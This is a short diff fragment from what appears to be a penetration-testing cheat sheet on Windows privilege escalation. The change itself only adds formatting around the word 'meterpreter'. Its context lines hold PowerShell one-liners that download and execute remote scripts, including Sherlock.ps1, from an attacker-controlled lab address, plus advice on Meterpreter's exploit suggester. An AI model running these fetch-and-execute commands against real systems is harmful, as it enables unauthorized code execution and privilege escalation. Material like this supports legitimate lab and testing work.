@@ -15,7 +15,7 @@ iex(new-object net.webclient).downloadstring('http://10.10.14.25/esc.ps1')
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.25/Sherlock.ps1') | PowerShell -Noprofile -
 ```
 
-if you're on meterpreter, run the exploit suggester with both x86 meterpreter and x64 meterpreter.
+if you're on `meterpreter`, run the exploit suggester with both x86 meterpreter and x64 meterpreter.
 
 ```text
 # collection of payloads and powershell scripts
